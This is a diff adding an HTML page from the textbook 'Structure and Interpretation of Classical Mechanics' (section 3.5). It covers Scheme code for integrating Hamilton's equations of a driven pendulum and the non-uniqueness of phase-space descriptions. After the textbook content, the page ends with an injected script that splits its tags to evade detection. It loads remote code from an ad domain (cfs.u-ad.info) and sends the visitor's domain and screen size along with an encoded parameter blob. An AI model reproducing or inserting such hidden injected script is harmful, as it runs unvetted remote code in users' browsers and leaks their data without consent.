@@ -1,0 +1,156 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-40.html">previous</a></span><span>, <a href="book-Z-H-42.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_3.5"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_3.5">3.5&nbsp;&nbsp;Phase Space Evolution</a></h2>
+<p>
+<a name="%_idx_1794"></a><a name="%_idx_1796"></a>
+Most problems do not have enough symmetries to be reducible to
+quadrature.  It is natural to turn to numerical integration to learn
+more about the evolution of such systems.  The evolution in phase
+space may be found by <a name="%_idx_1798"></a><a name="%_idx_1800"></a>numerical integration of Hamilton's equations.</p>
+<p>
+Hamilton's equations are already in first-order form; the <a name="%_idx_1802"></a><a name="%_idx_1804"></a>Hamiltonian
+state derivative is the same as the phase-space derivative:
+</p>
+<p><tt>(define&nbsp;Hamiltonian-&gt;state-derivative<br>
+&nbsp;&nbsp;phase-space-derivative)<br>
+</p>
+</tt>
+<p>
+<a name="FIGURE_3.9"></a></p>
+<div align=left><img src="chap3-Z-G-126.gif" border="0"></div>
+<p></p>
+<p>
+As an illustration, consider again the
+<a name="%_idx_1806"></a><a name="%_idx_1808"></a><a name="%_idx_1810"></a>periodically driven pendulum (see 
+section&nbsp;<a href="book-Z-H-13.html#%_sec_1.6.2">1.6.2</a>).  The Hamiltonian is
+</p>
+<p><tt>(show-expression<br>
+&nbsp;((Lagrangian-&gt;Hamiltonian<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(L-periodically-driven-pendulum&nbsp;'m&nbsp;'l&nbsp;'g&nbsp;'a&nbsp;'omega))<br>
+&nbsp;&nbsp;(up&nbsp;'t&nbsp;'theta&nbsp;'p_theta)))<br>
+</p>
+</tt>
+<p></p>
+<hr>
+
+<p></p>
+<div align=left><img src="chap3-Z-G-127.gif" border="0"></div>
+<p></p>
+<hr>
+
+<p>
+Hamilton's equations for the periodically driven pendulum are
+unrevealing, so we will not show them.  
+We build a system derivative
+from the Hamiltonian:
+</p>
+<p><tt><a name="%_idx_1812"></a>(define&nbsp;(H-pend-sysder&nbsp;m&nbsp;l&nbsp;g&nbsp;a&nbsp;omega)<br>
+&nbsp;&nbsp;(Hamiltonian-&gt;state-derivative<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(Lagrangian-&gt;Hamiltonian<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(L-periodically-driven-pendulum&nbsp;m&nbsp;l&nbsp;g&nbsp;a&nbsp;omega))))<br>
+</p>
+</tt>
+<p>Now we integrate this system, with the same initial conditions as in
+section&nbsp;<a href="book-Z-H-14.html#%_sec_1.7">1.7</a> (see figure&nbsp;<a href="book-Z-H-14.html#FIGURE_1.7">1.7</a>), but displaying the trajectory in phase space
+(figure&nbsp;<a href="#FIGURE_3.9">3.9</a>).  We make a monitor
+procedure to display the evolution in phase space:
+</p>
+<p><tt>(define&nbsp;((monitor-p-theta&nbsp;win)&nbsp;state)<br>
+&nbsp;&nbsp;(let&nbsp;((q&nbsp;((principal-value&nbsp;:pi)&nbsp;(coordinate&nbsp;state)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(p&nbsp;(momentum&nbsp;state)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(plot-point&nbsp;win&nbsp;q&nbsp;p)))<br>
+</p>
+</tt>
+<p><a name="%_idx_1814"></a>We use <tt>evolve</tt> to explore the evolution of the system:
+</p>
+<p><tt>(define&nbsp;window&nbsp;(frame&nbsp;:-pi&nbsp;:pi&nbsp;-10.0&nbsp;10.0))<br>
+<br>
+(let&nbsp;((m&nbsp;1.)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;m=1kg<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(l&nbsp;1.)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;l=1m<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(g&nbsp;9.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;g=9.8m/s<sup>2</sup><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(A&nbsp;0.1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;A=1/10&nbsp;m<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(omega&nbsp;(*&nbsp;2&nbsp;(sqrt&nbsp;9.8))))<br>
+&nbsp;&nbsp;((evolve&nbsp;H-pend-sysder&nbsp;m&nbsp;l&nbsp;g&nbsp;A&nbsp;omega)<br>
+&nbsp;&nbsp;&nbsp;(up&nbsp;0.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;t<sub>0</sub>=0<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;theta<sub>0</sub>=1&nbsp;rad<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;p<sub>0</sub>=0&nbsp;kg&nbsp;m<sup>2</sup>/s<br>
+&nbsp;&nbsp;&nbsp;(monitor-p-theta&nbsp;window)<br>
+&nbsp;&nbsp;&nbsp;0.01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;plot&nbsp;interval<br>
+&nbsp;&nbsp;&nbsp;100.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;final&nbsp;time<br>
+&nbsp;&nbsp;&nbsp;1.0e-12))<br>
+</p>
+</tt>
+<p>The trajectory sometimes oscillates and sometimes circulates.  The
+patterns in the phase plane are reminiscent of the trajectories in the
+phase plane of the undriven pendulum shown in
+figure&nbsp;<a href="book-Z-H-39.html#FIGURE_3.4">3.4</a>.</p>
+<p>
+</p>
+<a name="%_sec_3.5.1"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_3.5.1">3.5.1&nbsp;&nbsp;Phase-Space Description Is Not Unique</a></h3>
+<p><a name="%_idx_1816"></a><a name="%_idx_1818"></a>
+
+We are familiar with the fact that a given motion of a system is
+expressed differently in different coordinate systems: the functions
+that express a motion in rectangular coordinates are different from
+the functions that express the same motion in polar coordinates.
+However, in a given coordinate system the evolution of the local
+state tuple for particular initial conditions is unique.  The
+generalized velocity path function is the derivative of the
+generalized coordinate path function.  On the other hand, the
+coordinate system alone does not uniquely specify the phase-space
+description.  The relationship of the momentum to the coordinates and
+the velocities depends on the Lagrangian, and many different
+Lagrangians may be used to describe the behavior of the same physical
+system.  When two Lagrangians for the same physical system are
+different, the phase-space descriptions of a dynamical state are
+different.</p>
+<p>
+We have already seen two different Lagrangians for the <a name="%_idx_1820"></a>driven pendulum
+(see section&nbsp;<a href="book-Z-H-13.html#%_sec_1.6.4">1.6.4</a>): one was found using <em>L</em> = <em>T</em> <tt>-</tt> <em>V</em>
+and the other was found by inspection of the equations of motion.  The
+two Lagrangians differ by a <a name="%_idx_1822"></a><a name="%_idx_1824"></a>total time derivative.  The momentum&nbsp;<em>p</em><sub><img src="chap1-Z-G-D-19.gif" border="0"></sub>
+conjugate to <img src="chap1-Z-G-D-19.gif" border="0"> depends on which Lagrangian we choose
+to work with, and the description of the evolution in the
+corresponding phase space also depends on the choice of Lagrangian,
+even though the behavior of the system is independent of the method
+used to describe it.  The momentum conjugate to <img src="chap1-Z-G-D-19.gif" border="0">, using the
+<em>L</em> = <em>T</em> <tt>-</tt> <em>V</em> Lagrangian for the periodically driven pendulum, is
+<a name="EQUATION_3.120"></a></p>
+<div align=left><img src="chap3-Z-G-128.gif" border="0"></div>
+<p>
+and the momentum conjugate to <img src="chap1-Z-G-D-19.gif" border="0">, with the alternate
+Lagrangian, is
+<a name="EQUATION_3.121"></a></p>
+<div align=left><img src="chap3-Z-G-129.gif" border="0"></div>
+<p> 
+The two momenta differ by an additive distortion that varies
+periodically in time and depends on <img src="chap1-Z-G-D-19.gif" border="0">.  That the phase-space
+descriptions are different is illustrated in
+figure&nbsp;<a href="#FIGURE_3.10">3.10</a>.  The evolution of the
+system is the same for each.
+<a name="FIGURE_3.10"></a></p>
+<div align=left><img src="chap3-Z-G-130.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-40.html">previous</a></span><span>, <a href="book-Z-H-42.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD1gAEROifkIIR4xs%2fNDjFFXAXGycsSakVjOkK4wTwlcJp005WJ2IzFp8wFC7QQe7U6nYD0LXeGHsGTwrnXFNtnIsQFUjeinoLuawVkHmYdZNecfmb9TD%2bis6fDaGHjT6FwS5YRBsFAocraMTcJSZlp3ZCrqgh8IiU2dVlCNoJ3P%2bXz6VOQfkPDPgLWUMBPq8TZ%2bOSdGIw%2bWoZCn9aflirNW%2fMwI4vaHohJCfm5d8%2b%2fEudGz1JvnySalhJXnBjE%2byaYT151kkk7BGDuo%2fQoNmYyFq7RmIaodPK4XBCBwHz1n441PsCagdCRfsiWhSW0L%2b6MU0x%2fsUajA0PR4cXSotUEwY4rHSisu1F6tfSrQt9YzH%2friG%2fgjG6oUmfo6hke1UGpNAKC24Ocm07WsKHZMZ1Ty1BwYtqS%2bA7ANnYSMF7LxB2Crc9sX9gzu24OuoB75qemEvoJQAFxtCQXfMyUYZ23t");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
